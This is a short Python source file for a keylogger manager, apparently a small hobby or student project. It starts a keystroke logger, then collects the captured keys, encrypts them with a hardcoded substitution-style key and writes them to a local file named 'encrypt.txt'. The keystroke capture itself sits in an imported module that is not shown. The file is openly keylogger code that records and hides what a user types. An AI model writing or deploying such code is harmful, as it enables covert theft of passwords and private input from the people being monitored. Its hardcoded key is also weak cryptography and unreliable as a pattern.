from KeyLoggerService import KeyLogger
from fileWriter import MyFile
from Encryption import Crypto

class KeyLoggerManager:
    def __init__(self):
        self.logger = KeyLogger()
        self.file = MyFile("encrypt.txt")
        self.crypto = Crypto("abcdefjhijklmnopqrstuvwxyz")


    def start_logger(self):
        self.logger.start_logging()

    def stop_logger(self):
        self.logger.stop_logging()
        data = str(self.logger.get_logged_keys())

        encrypt = self.crypto.process(data)
        self.file.write_to_file(str(encrypt))




if __name__ == "__main__":
    a = KeyLoggerManager()
    a.start_logger()
    a.stop_logger()
    print(a.file.file_name)
    print(a.file.read_file())
